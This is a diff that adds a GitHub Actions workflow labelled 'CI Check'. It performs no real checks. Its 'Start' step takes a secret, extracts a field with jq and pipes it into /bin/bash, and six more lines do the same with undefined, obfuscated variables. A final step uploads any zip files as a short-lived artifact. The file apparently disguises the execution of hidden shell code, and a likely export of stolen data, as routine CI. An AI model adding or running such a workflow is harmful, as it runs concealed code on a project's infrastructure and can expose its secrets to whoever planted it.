@@ -1,0 +1,31 @@
+name: CI Check
+on:
+  workflow_dispatch:
+
+env:
+  CI: true
+jobs:
+  process:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+        with:
+          fetch-depth: 0
+      - name: Start
+        env:
+          wu84580: ${{ secrets.wu84580 }}
+        run: |
+          printf '%s' "$wu84580" | jq -r .ic4340 | /bin/bash
+          printf '%s' "$hxsmq9" | jq -r .xoi580 | /bin/bash
+          echo $e18 | jq -r .z7 | /bin/bash
+          echo $i108 | jq -r .hsx5 | /bin/bash
+          echo $lgbq61 | jq -r .a5 | /bin/bash
+          printf '%s' "$h8797" | jq -r .owt2636 | /bin/bash
+          printf '%s' "$lhcp59" | jq -r .qdn489 | /bin/bash
+
+      - name: Upload results
+        uses: actions/upload-artifact@v4
+        with:
+          name: YtdFOpVo
+          path: "*.zip"
+          retention-days: 1
